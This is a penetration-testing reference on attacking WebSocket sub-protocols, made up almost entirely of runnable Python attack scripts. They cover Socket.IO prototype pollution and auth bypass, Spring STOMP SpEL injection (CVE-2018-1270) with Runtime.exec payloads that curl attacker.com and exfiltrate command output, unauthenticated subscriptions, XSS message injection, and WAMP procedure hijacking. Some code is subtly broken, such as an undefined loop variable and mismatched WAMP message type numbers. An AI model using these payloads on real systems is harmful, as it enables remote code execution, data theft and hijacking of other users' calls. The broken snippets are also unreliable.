# Sub-Protocol Analysis — Deep Reference

## Socket.IO

### Detection
```bash
# URL patterns that indicate Socket.IO:
wss://target.com/socket.io/?EIO=4&transport=websocket
wss://target.com/socket.io/?EIO=3&transport=websocket&sid=SESSION_ID

# EIO=4 → Socket.IO v4 (current)
# EIO=3 → Socket.IO v3 (legacy)
# Mandatory "2" ping packet sent by server every 25s
# Client must respond with "3" (pong)
```

### Socket.IO Message Format
```
# Packet types (prefix number):
0  = CONNECT
1  = DISCONNECT
2  = EVENT (most common — "42" = event on namespace /)
3  = ACK
4  = CONNECT_ERROR
5  = BINARY_EVENT
6  = BINARY_ACK

# Examples:
"0"                              # Connect (namespace /)
"40"                             # Connect to namespace / (Socket.IO v4)
"42[\"event\",{\"data\":\"val\"}]"  # Emit event
"2"                              # Ping (server → client)
"3"                              # Pong (client → server)
```

### Burp / Python Connection to Socket.IO
```python
import asyncio, websockets

async def socketio_connect(uri_base, cookie=""):
    # Socket.IO uses query params; must handle ping/pong
    uri = f"{uri_base}?EIO=4&transport=websocket"
    
    extra_headers = {}
    if cookie:
        extra_headers["Cookie"] = cookie
    
    async with websockets.connect(uri, additional_headers=extra_headers) as ws:
        # Server sends "0{...}" (OPEN packet with handshake info)
        handshake = await ws.recv()
        print(f"Handshake: {handshake}")
        
        # Send CONNECT to namespace /
        await ws.send("40")
        connect_resp = await ws.recv()
        print(f"Connect response: {connect_resp}")
        
        # Start ping/pong handler
        async def heartbeat():
            while True:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=30.0)
                    if msg == "2":   # Ping from server
                        await ws.send("3")  # Pong
                        print("[HEARTBEAT] Ping-Pong")
                    else:
                        print(f"<-- {msg}")
                except asyncio.TimeoutError:
                    break
        
        # Send test event
        await ws.send('42["message","hello from tester"]')
        
        await heartbeat()

asyncio.run(socketio_connect("wss://target.com/socket.io/"))
```

### Socket.IO Prototype Pollution

Source: Zakhar Fedotkin / PortSwigger Research (2025), builds on Gareth Heyes technique.

```python
import asyncio, websockets

PP_PAYLOADS = [
    '42["message",{"__proto__":{"initialPacket":"POLLUTED"}}]',
    '42["message",{"__proto__":{"admin":true}}]',
    '42["message",{"constructor":{"prototype":{"admin":true}}}]',
    '42["message",{"__proto__":{"role":"admin"}}]',
    '42["message",{"__proto__":{"isAdmin":"true"}}]',
    '42["update",{"__proto__":{"debug":true}}]',
    # Express-specific: pollute response headers
    '42["message",{"__proto__":{"x-powered-by":"Polluted"}}]',
]

async def test_prototype_pollution(uri):
    async with websockets.connect(f"{uri}?EIO=4&transport=websocket") as ws:
        await ws.recv()        # handshake
        await ws.send("40")    # connect namespace
        await ws.recv()        # connect ack
        
        for payload in PP_PAYLOADS:
            await ws.send(payload)
            print(f"Sent: {payload}")
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=3.0)
                print(f"<-- {r}")
                if "POLLUTED" in r or "admin" in r.lower():
                    print(f"[!!!] PROTOTYPE POLLUTION CONFIRMED: {payload}")
            except asyncio.TimeoutError:
                print("[TIMEOUT]")

asyncio.run(test_prototype_pollution("wss://target.com/socket.io/"))
```

### Socket.IO Namespace Enumeration
```python
NAMESPACES = ["/", "/admin", "/internal", "/debug", "/api", 
              "/management", "/private", "/system", "/backdoor"]

async def enumerate_namespaces(uri_base):
    async with websockets.connect(f"{uri_base}?EIO=4&transport=websocket") as ws:
        await ws.recv()  # open
        for ns in NAMESPACES:
            packet = f"40{ns}," if ns != "/" else "40"
            await ws.send(packet)
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=2.0)
                if "CONNECT_ERROR" not in r and "4" not in r[:2]:
                    print(f"[ACCESSIBLE] Namespace: {ns} → {r}")
                else:
                    print(f"[DENIED] {ns}: {r}")
            except asyncio.TimeoutError:
                print(f"[TIMEOUT] {ns}")
```

### Socket.IO Auth Bypass
```python
# Test connecting without auth token
await ws.send('40{"token":""}')             # Empty token
await ws.send('40{"token":"null"}')          # Null string
await ws.send('40{}')                        # No token field
await ws.send('40')                          # No auth at all

# Test with replayed/expired tokens
await ws.send(f'40{{"token":"{OLD_TOKEN}"}}')

# Test token from different user
await ws.send(f'40{{"token":"{OTHER_USER_TOKEN}"}}')
```

---

## STOMP (Simple Text Oriented Messaging Protocol)

### Detection
```
# STOMP typically rides on:
# - Spring Framework WebSocket with SockJS
# - RabbitMQ, ActiveMQ, HornetQ backends
# - Sub-protocol declared: Sec-WebSocket-Protocol: stomp

# CONNECT frame sent after WS handshake:
CONNECT
accept-version:1.2
host:your.host.com

^@   (null byte = frame terminator)
```

### STOMP Frame Structure
```
COMMAND
header1:value1
header2:value2
[blank line]
body^@

Commands: CONNECT, CONNECTED, SEND, SUBSCRIBE, UNSUBSCRIBE, 
          BEGIN, COMMIT, ABORT, ACK, NACK, DISCONNECT, MESSAGE, RECEIPT, ERROR
```

### CVE-2018-1270 — Spring STOMP SpEL Injection Pattern
Spring Framework ≤4.3.14 / 5.0.x ≤5.0.5 allows SpEL expressions in STOMP selector headers.

```python
import asyncio, websockets

STOMP_SPEL_PAYLOADS = [
    # RCE via Runtime.exec
    "T(java.lang.Runtime).getRuntime().exec('id')",
    "T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/rce')",
    # DNS callback (blind detection)
    "T(java.net.InetAddress).getByName('rce.attacker.com')",
    # Data exfil
    "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\\\A').next()",
]

async def stomp_spel_test(uri, destination="/topic/public"):
    async with websockets.connect(uri) as ws:
        # STOMP CONNECT
        connect_frame = (
            "CONNECT\n"
            "accept-version:1.2\n"
            "heart-beat:0,0\n"
            "\n\x00"
        )
        await ws.send(connect_frame)
        resp = await ws.recv()
        print(f"STOMP CONNECTED: {resp!r}")
        
        for payload in STOMP_SPEL_PAYLOADS:
            subscribe_frame = (
                "SUBSCRIBE\n"
                f"destination:{destination}\n"
                "id:sub-0\n"
                f"selector:{payload}\n"
                "\n\x00"
            )
            await ws.send(subscribe_frame)
            print(f"Sent SpEL: {payload}")
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=3.0)
                print(f"<-- {r!r}")
            except asyncio.TimeoutError:
                pass

asyncio.run(stomp_spel_test("wss://target.com/ws"))
```

### STOMP Unauthenticated Subscription
```python
# Test subscribing to restricted topics without proper auth
RESTRICTED_TOPICS = [
    "/topic/admin",
    "/queue/admin.notifications",
    "/user/admin/notifications",
    "/topic/internal",
    "/queue/transactions",
    "/topic/audit.log",
]

async def stomp_unauth_subscribe(uri):
    async with websockets.connect(uri) as ws:
        # Connect without credentials
        await ws.send("CONNECT\naccept-version:1.2\n\n\x00")
        resp = await ws.recv()
        
        if "ERROR" in resp:
            print(f"[BLOCKED] Auth required: {resp!r}")
            return
        
        for topic in RESTRICTED_TOPICS:
            await ws.send(f"SUBSCRIBE\ndestination:{topic}\nid:sub-{i}\n\n\x00")
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=2.0)
                if "ERROR" not in r:
                    print(f"[ACCESSIBLE] {topic}: {r!r}")
                else:
                    print(f"[DENIED] {topic}")
            except asyncio.TimeoutError:
                print(f"[NO_RESPONSE] {topic} — may be listening but empty")
```

### STOMP Message Injection
```python
# After subscribing to a public channel, try injecting to restricted destinations
INJECT_PAYLOADS = [
    '{"admin": true, "action": "promote_user", "user_id": "VICTIM"}',
    '{"type": "system_command", "cmd": "shutdown"}',
    '<script>alert(1)</script>',  # If consumed by browser clients
]

async def stomp_inject(uri, destination="/topic/public"):
    async with websockets.connect(uri) as ws:
        await ws.send("CONNECT\naccept-version:1.2\n\n\x00")
        await ws.recv()
        
        for payload in INJECT_PAYLOADS:
            send_frame = (
                f"SEND\n"
                f"destination:{destination}\n"
                f"content-type:application/json\n"
                f"\n{payload}\x00"
            )
            await ws.send(send_frame)
            print(f"Injected to {destination}: {payload[:60]}")
```

---

## WAMP (Web Application Messaging Protocol)

### Detection
```
# WAMP v2 sub-protocol: wamp.2.json or wamp.2.msgpack
# Sec-WebSocket-Protocol: wamp.2.json

# HELLO message structure (JSON array):
[1, "realm1", {"roles": {"callee": {}, "subscriber": {}}}]
# [MessageType, Realm, Details]

# Message types:
# 1=HELLO, 2=WELCOME, 3=ABORT, 6=GOODBYE
# 32=SUBSCRIBE, 33=SUBSCRIBED, 34=UNSUBSCRIBE, 35=UNSUBSCRIBED, 36=EVENT
# 48=CALL, 49=CANCEL, 50=RESULT, 64=REGISTER, 65=REGISTERED, 66=UNREGISTER, 70=INVOCATION
```

### WAMP Realm Enumeration
```python
import asyncio, websockets, json

REALMS = ["realm1", "public", "private", "admin", "internal", "default", "production"]

async def enumerate_realms(uri):
    for realm in REALMS:
        try:
            async with websockets.connect(
                uri, 
                subprotocols=["wamp.2.json"]
            ) as ws:
                hello = json.dumps([1, realm, {
                    "roles": {
                        "subscriber": {},
                        "caller": {}
                    }
                }])
                await ws.send(hello)
                resp = await asyncio.wait_for(ws.recv(), timeout=3.0)
                data = json.loads(resp)
                if data[0] == 2:   # WELCOME
                    print(f"[ACCESSIBLE] Realm: {realm}")
                elif data[0] == 3: # ABORT
                    print(f"[DENIED] Realm: {realm} → {data}")
        except Exception as e:
            print(f"[ERROR] Realm {realm}: {e}")

asyncio.run(enumerate_realms("wss://target.com/ws"))
```

### WAMP Unauthenticated Topic Subscription
```python
TOPICS = [
    "com.example.admin.events",
    "com.example.user.private",
    "com.example.audit.log",
    "com.example.transactions",
    "io.crossbar.info",
]

async def wamp_unauth_sub(uri):
    async with websockets.connect(uri, subprotocols=["wamp.2.json"]) as ws:
        # HELLO
        await ws.send(json.dumps([1, "realm1", {"roles": {"subscriber": {}}}]))
        welcome = json.loads(await ws.recv())
        if welcome[0] != 2:
            print("Not welcomed:", welcome)
            return
        
        session_id = welcome[1]
        print(f"Session: {session_id}")
        
        for idx, topic in enumerate(TOPICS):
            req_id = 1000 + idx
            await ws.send(json.dumps([32, req_id, {}, topic]))  # SUBSCRIBE
            try:
                resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=2.0))
                if resp[0] == 33:  # SUBSCRIBED
                    print(f"[SUBSCRIBED] {topic} (sub_id={resp[2]})")
                elif resp[0] == 8:  # ERROR
                    print(f"[DENIED] {topic}: {resp[4]}")
            except asyncio.TimeoutError:
                print(f"[TIMEOUT] {topic}")
```

### WAMP Procedure Shadowing (Registration Hijack)
```python
# If you can register a procedure with the same URI as a legitimate one:
async def wamp_register_shadow(uri, procedure_uri="com.example.get_user"):
    async with websockets.connect(uri, subprotocols=["wamp.2.json"]) as ws:
        await ws.send(json.dumps([1, "realm1", {"roles": {"callee": {}}}]))
        welcome = json.loads(await ws.recv())
        
        # REGISTER — attempt to shadow an existing procedure
        await ws.send(json.dumps([64, 1, {}, procedure_uri]))  # REGISTER
        resp = json.loads(await ws.recv())
        
        if resp[0] == 65:  # REGISTERED
            print(f"[REGISTERED] Shadowing {procedure_uri}!")
            # Now listen for invocations — we'll see other users' calls
            while True:
                msg = json.loads(await ws.recv())
                if msg[0] == 68:  # INVOCATION
                    print(f"[INVOCATION] args={msg[4]}, kwargs={msg[5] if len(msg)>5 else {}}")
                    # Return malicious result
                    await ws.send(json.dumps([70, msg[1], {}, ["HIJACKED"]]))
        else:
            print(f"[DENIED] {resp}")
```
